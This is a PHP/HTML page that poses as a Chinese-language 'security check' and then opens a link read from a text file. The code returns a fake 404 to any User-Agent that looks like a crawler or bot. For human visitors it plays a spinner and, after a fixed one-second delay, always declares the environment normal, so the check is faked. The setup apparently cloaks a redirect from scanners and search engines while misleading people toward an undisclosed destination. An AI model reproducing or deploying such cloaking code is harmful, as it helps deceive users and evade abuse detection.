<?php
$user_agent = $_SERVER['HTTP_USER_AGENT']; // 获取客户端的User-Agent
if (preg_match('/bot|crawl|slurp|spider/i', $user_agent)) {
  header('HTTP/1.0 404 Not Found'); // 返回404错误页面
  exit();
} else {
}
?>
<?php
$default_link1 = file_get_contents("default_link1.txt");
?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>安全检测</title>
		<style type="text/css">
			* {
						  box-sizing: border-box;
						  margin: 0;
						  padding: 0;
						}
						body {
						  font-family: Arial, sans-serif;
						  background-color: #f8f8f8;
						}
						.container {
						  width: 100%;
						  height: 100vh;
						  display: flex;
						  flex-direction: column;
						  justify-content: center;
						  align-items: center;
						}
						.loader {
						  border: 5px solid #f3f3f3;
						  border-top: 5px solid #3498db;
						  border-radius: 50%;
						  width: 30px;
						  height: 30px;
						  animation: spin 1s linear infinite;
						  margin-bottom: 20px;
						}
						@keyframes spin {
						  0% {
						    transform: rotate(0deg);
						  }
						  100% {
						    transform: rotate(360deg);
						  }
						}
						.btn {
						  background-color: #799991;
						  border: none;
						  color: #fff;
						  padding: 15px 25px;
						  font-size: 20px;
						  border-radius: 5px;
						  cursor: pointer;
						  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
						  transition: background-color 0.3s ease;
						  margin-top: 20px;
						  display: none;
						}
						.btn:hover {
						  background-color: #2980b9;
						}
						.alert {
						  color: #c0392b;
						  font-size: 14px;
						  font-weight: bold;
						  margin-top: 20px;
						  display: none;
						}
						.success {
						  color: #2ecc71;
						  font-size: 30px;
						  font-weight: bold;
						  margin-top: 20px;
						  display: none;
						}
						@media screen and (max-width: 600px) {
						  .btn {
						    font-size: 20px;
						  }
						  .alert,
						  .success {
						    font-size: 20px;
						  }
						}
		</style>
		<script type="text/javascript">
			window.onload = function() {
									// 获取按钮和提示框元素
									var btn = document.getElementById("continue-btn");
									var alert = document.getElementById("alert");
									var success = document.getElementById("success");
									// 隐藏加载动画和提示框，显示正在检测信息
									var loader = document.getElementById("loader");
									loader.style.display = "block";
									alert.style.display = "none";
									success.style.display = "none";
									var info = document.createElement("p");
									info.innerHTML = "正在检测用户上网环境，请稍等...";
									document.getElementById("container").appendChild(info);
					            	// 检测完成后隐藏加载动画，显示检测正常信息和按钮
					            	setTimeout(function() {
						              loader.style.display = "none";
					            	  info.style.display = "none";
						              success.style.display = "block";
						              btn.style.display = "block";
					            	}, 1000);
								// 点击按钮打开链接
								btn.onclick = function() {
									window.open("<?php echo $default_link1; ?>");
								};
							};
		</script>
	</head>
	<body>
		<div id="container" class="container">
			<div id="loader" class="loader"></div>
			<div id="alert" class="alert">检测失败，请确认您不是机器人或自动程序。</div>
			<div id="success" class="success">当前环境正常，请点击按钮继续。</div>
			<button id="continue-btn" class="btn">继续</button>
		</div>
	</body>
</html>